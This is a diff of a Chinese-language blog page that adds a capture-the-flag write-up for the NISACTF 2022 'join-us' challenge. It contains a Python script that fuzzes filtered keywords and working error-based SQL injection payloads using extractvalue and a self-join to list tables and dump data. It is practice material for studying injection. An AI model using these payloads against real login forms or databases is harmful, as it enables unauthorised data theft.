@@ -51,8 +51,18 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240430205709510.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240430205600578.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240430212747415.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502134623307.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502134634829.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502134658336.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502134744079.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502134833801.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502135232954.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502135652941.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502140245389.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502140506250.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502140639265.png">
 <meta property="article:published_time" content="2024-01-07T14:43:30.000Z">
-<meta property="article:modified_time" content="2024-04-30T14:03:14.557Z">
+<meta property="article:modified_time" content="2024-05-02T06:06:42.308Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="CTF刷题记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -256,7 +266,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.6k words
+          7.8k words
         
       </span>
     
@@ -267,7 +277,7 @@
         
         
         
-          31 mins
+          66 mins
         
       </span>
     
@@ -439,6 +449,64 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="hljs-number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>replace(replace(&quot;.&quot;,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),&quot;.&quot;)#<span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240430212747415.png" srcset="/img/loading.gif" lazyload alt="image-20240430212747415"></p>
+<h1 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h1><p><strong>0x00</strong></p>
+<p>使用的知识点</p>
+<ol>
+<li><p>无列注入</p>
+<p>禁用columns，使用join</p>
+</li>
+<li><p>报错注入</p>
+<p>两个方法</p>
+<blockquote>
+<p>updatexml()</p>
+<p>extractvalue()</p>
+</blockquote>
+</li>
+<li><p>禁用databases</p>
+<p>可以使用一个不存在的表，然后就会返回报错</p>
+</li>
+</ol>
+<p><strong>0x01</strong></p>
+<p>发现登录页面点进去，发现注入点</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502134623307.png" srcset="/img/loading.gif" lazyload alt="image-20240502134623307"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502134634829.png" srcset="/img/loading.gif" lazyload alt="image-20240502134634829"></p>
+<p>测试</p>
+<p>1,0</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502134658336.png" srcset="/img/loading.gif" lazyload alt="image-20240502134658336"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502134744079.png" srcset="/img/loading.gif" lazyload alt="image-20240502134744079"></p>
+<p>发现是单引号闭合</p>
+<p>尝试fuzz 测试，看禁用了什么</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>fuzz=&#123;<span class="hljs-string">&#x27;length &#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;handler&#x27;</span>,<span class="hljs-string">&#x27;like&#x27;</span>,<span class="hljs-string">&#x27;select&#x27;</span>,<span class="hljs-string">&#x27;sleep&#x27;</span>,<span class="hljs-string">&#x27;database&#x27;</span>,<span class="hljs-string">&#x27;delete&#x27;</span>,<span class="hljs-string">&#x27;having&#x27;</span>,<span class="hljs-string">&#x27;or&#x27;</span>,<span class="hljs-string">&#x27;as&#x27;</span>,<span class="hljs-string">&#x27;-~&#x27;</span>,<span class="hljs-string">&#x27;BENCHMARK&#x27;</span>,<span class="hljs-string">&#x27;limit&#x27;</span>,<span class="hljs-string">&#x27;left&#x27;</span>,<span class="hljs-string">&#x27;select&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span><br>,<span class="hljs-string">&#x27;sys.schema_auto_increment_columns&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>,<span class="hljs-string">&#x27;right&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;handler&#x27;</span>,<span class="hljs-string">&#x27;---&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-string">&#x27;--+&#x27;</span>,<span class="hljs-string">&#x27;INFORMATION&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;xor&#x27;</span>,<span class="hljs-string">&#x27;&lt;&gt;&#x27;</span><br>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>,<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;^&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;AND&#x27;</span>,<span class="hljs-string">&#x27;BY&#x27;</span>,<span class="hljs-string">&#x27;CAST&#x27;</span>,<span class="hljs-string">&#x27;COLUMN&#x27;</span>,<span class="hljs-string">&#x27;COUNT&#x27;</span>,<span class="hljs-string">&#x27;CREATE&#x27;</span>,<span class="hljs-string">&#x27;END&#x27;</span>,<span class="hljs-string">&#x27;case&#x27;</span>,<span class="hljs-string">&quot;&#x27;1&#x27;=&#x27;1&#x27;&quot;</span>,<span class="hljs-string">&#x27;when&#x27;</span>,<span class="hljs-string">&quot;admin&#x27;&quot;</span>,<span class="hljs-string">&#x27;length&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;REVERSE&#x27;</span>,<span class="hljs-string">&#x27;ascii&#x27;</span><br>,<span class="hljs-string">&#x27;select&#x27;</span>,<span class="hljs-string">&#x27;database&#x27;</span>,<span class="hljs-string">&#x27;left&#x27;</span>,<span class="hljs-string">&#x27;right&#x27;</span>,<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;||&#x27;</span>,<span class="hljs-string">&#x27;oorr&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;//&#x27;</span>,<span class="hljs-string">&#x27;//*&#x27;</span>,<span class="hljs-string">&#x27;*/*&#x27;</span>,<span class="hljs-string">&#x27;/**/&#x27;</span>,<span class="hljs-string">&#x27;anandd&#x27;</span>,<span class="hljs-string">&#x27;GROUP&#x27;</span>,<span class="hljs-string">&#x27;HAVING&#x27;</span>,<span class="hljs-string">&#x27;IF&#x27;</span>,<span class="hljs-string">&#x27;INTO&#x27;</span>,<span class="hljs-string">&#x27;JOIN&#x27;</span>,<span class="hljs-string">&#x27;LEAVE&#x27;</span>,<span class="hljs-string">&#x27;LEFT&#x27;</span><br>,<span class="hljs-string">&#x27;LEVEL&#x27;</span>,<span class="hljs-string">&#x27;sleep&#x27;</span>,<span class="hljs-string">&#x27;LIKE&#x27;</span>,<span class="hljs-string">&#x27;NAMES&#x27;</span>,<span class="hljs-string">&#x27;NEXT&#x27;</span>,<span class="hljs-string">&#x27;NULL&#x27;</span>,<span class="hljs-string">&#x27;OF&#x27;</span>,<span class="hljs-string">&#x27;ON&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;infromation_schema&#x27;</span>,<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-string">&#x27;OR&#x27;</span>,<span class="hljs-string">&#x27;ORDER&#x27;</span>,<span class="hljs-string">&#x27;ORD&#x27;</span>,<span class="hljs-string">&#x27;SCHEMA&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;SET&#x27;</span>,<span class="hljs-string">&#x27;TABLE&#x27;</span>,<span class="hljs-string">&#x27;THEN&#x27;</span><br>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;USER&#x27;</span>,<span class="hljs-string">&#x27;USING&#x27;</span>,<span class="hljs-string">&#x27;VALUE&#x27;</span>,<span class="hljs-string">&#x27;VALUES&#x27;</span>,<span class="hljs-string">&#x27;WHEN&#x27;</span>,<span class="hljs-string">&#x27;WHERE&#x27;</span>,<span class="hljs-string">&#x27;ADD&#x27;</span>,<span class="hljs-string">&#x27;AND&#x27;</span>,<span class="hljs-string">&#x27;prepare&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&#x27;update&#x27;</span>,<span class="hljs-string">&#x27;delete&#x27;</span>,<span class="hljs-string">&#x27;drop&#x27;</span>,<span class="hljs-string">&#x27;inset&#x27;</span>,<span class="hljs-string">&#x27;CAST&#x27;</span>,<span class="hljs-string">&#x27;COLUMN&#x27;</span>,<span class="hljs-string">&#x27;CONCAT&#x27;</span><br>,<span class="hljs-string">&#x27;GROUP_CONCAT&#x27;</span>,<span class="hljs-string">&#x27;group_concat&#x27;</span>,<span class="hljs-string">&#x27;CREATE&#x27;</span>,<span class="hljs-string">&#x27;DATABASE&#x27;</span>,<span class="hljs-string">&#x27;DATABASES&#x27;</span>,<span class="hljs-string">&#x27;alter&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;DROP&#x27;</span>,<span class="hljs-string">&#x27;floor&#x27;</span>,<span class="hljs-string">&#x27;rand()&#x27;</span>,<span class="hljs-string">&#x27;information_schema.tables&#x27;</span>,<span class="hljs-string">&#x27;TABLE_SCHEMA&#x27;</span><br>,<span class="hljs-string">&#x27;%df&#x27;</span>,<span class="hljs-string">&#x27;concat_ws()&#x27;</span>,<span class="hljs-string">&#x27;concat&#x27;</span>,<span class="hljs-string">&#x27;LIMIT&#x27;</span>,<span class="hljs-string">&#x27;ORD&#x27;</span>,<span class="hljs-string">&#x27;ON&#x27;</span><br>,<span class="hljs-string">&#x27;extractvalue&#x27;</span>,<span class="hljs-string">&#x27;order&#x27;</span>,<span class="hljs-string">&#x27;CAST()&#x27;</span>,<span class="hljs-string">&#x27;by&#x27;</span>,<span class="hljs-string">&#x27;ORDER&#x27;</span>,<span class="hljs-string">&#x27;OUTFILE&#x27;</span>,<span class="hljs-string">&#x27;RENAME&#x27;</span>,<span class="hljs-string">&#x27;REPLACE&#x27;</span>,<span class="hljs-string">&#x27;SCHEMA&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;SET&#x27;</span>,<span class="hljs-string">&#x27;updatexml&#x27;</span>,<span class="hljs-string">&#x27;SHOW&#x27;</span>,<span class="hljs-string">&#x27;SQL&#x27;</span>,<span class="hljs-string">&#x27;TABLE&#x27;</span>,<span class="hljs-string">&#x27;THEN&#x27;</span>,<span class="hljs-string">&#x27;TRUE&#x27;</span>,<span class="hljs-string">&#x27;instr&#x27;</span><br>,<span class="hljs-string">&#x27;benchmark&#x27;</span>,<span class="hljs-string">&#x27;format&#x27;</span>,<span class="hljs-string">&#x27;bin&#x27;</span>,<span class="hljs-string">&#x27;substring&#x27;</span>,<span class="hljs-string">&#x27;ord&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;VALUES&#x27;</span>,<span class="hljs-string">&#x27;VARCHAR&#x27;</span>,<span class="hljs-string">&#x27;VERSION&#x27;</span>,<span class="hljs-string">&#x27;WHEN&#x27;</span>,<span class="hljs-string">&#x27;WHERE&#x27;</span>,<span class="hljs-string">&#x27;/*&#x27;</span>,<span class="hljs-string">&#x27;`&#x27;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;users&#x27;</span>,<span class="hljs-string">&#x27;%0a&#x27;</span>,<span class="hljs-string">&#x27;%0b&#x27;</span>,<span class="hljs-string">&#x27;mid&#x27;</span>,<span class="hljs-string">&#x27;for&#x27;</span>,<span class="hljs-string">&#x27;BEFORE&#x27;</span>,<span class="hljs-string">&#x27;REGEXP&#x27;</span><br>,<span class="hljs-string">&#x27;RLIKE&#x27;</span>,<span class="hljs-string">&#x27;in&#x27;</span>,<span class="hljs-string">&#x27;sys schemma&#x27;</span>,<span class="hljs-string">&#x27;SEPARATOR&#x27;</span>,<span class="hljs-string">&#x27;XOR&#x27;</span>,<span class="hljs-string">&#x27;CURSOR&#x27;</span>,<span class="hljs-string">&#x27;FLOOR&#x27;</span>,<span class="hljs-string">&#x27;sys.schema_table_statistics_with_buffer&#x27;</span>,<span class="hljs-string">&#x27;INFILE&#x27;</span>,<span class="hljs-string">&#x27;count&#x27;</span>,<span class="hljs-string">&#x27;%0c&#x27;</span>,<span class="hljs-string">&#x27;from&#x27;</span>,<span class="hljs-string">&#x27;%0d&#x27;</span>,<span class="hljs-string">&#x27;%a0&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;@&#x27;</span>,<span class="hljs-string">&#x27;else&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fuzz:<br>    res = requests.post(url=<span class="hljs-string">&#x27;http://node5.anna.nssctf.cn:20809/dl.php&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;tt&#x27;</span>:i&#125;)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;不要耍小心思喔~&#x27;</span>  <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502134833801.png" srcset="/img/loading.gif" lazyload alt="image-20240502134833801"></p>
+<p>发现了禁用挺多的</p>
+<p>发现没有禁用</p>
+<blockquote>
+<p>extractvalue</p>
+<p>还有|| </p>
+</blockquote>
+<p><strong>0x02</strong></p>
+<p>尝试爆破数据库</p>
+<p>但是databases被禁用了</p>
+<p>可以尝试访问一个不存在的表</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502135232954.png" srcset="/img/loading.gif" lazyload alt="image-20240502135232954"></p>
+<p>得到数据库的名字</p>
+<p><strong>0x03</strong></p>
+<p>获取表名</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">tt=1&#x27; || extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;sqlsql&#x27;</span>)))#<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502135652941.png" srcset="/img/loading.gif" lazyload alt="image-20240502135652941"></p>
+<p>但是可以通过</p>
+<p><strong>0x04</strong></p>
+<p>因为列名也被禁用了，就只能使用join </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">tt<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,(select * from (select * from Fal_flag a join Fal_flag b using(id,data)) c)))#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502140245389.png" srcset="/img/loading.gif" lazyload alt="image-20240502140245389"></p>
+<p>发现不存在</p>
+<p>爆破另一张</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502140506250.png" srcset="/img/loading.gif" lazyload alt="image-20240502140506250"></p>
+<p>然后添加mid截取</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240502140639265.png" srcset="/img/loading.gif" lazyload alt="image-20240502140639265"></p>
 
                 
               </div>
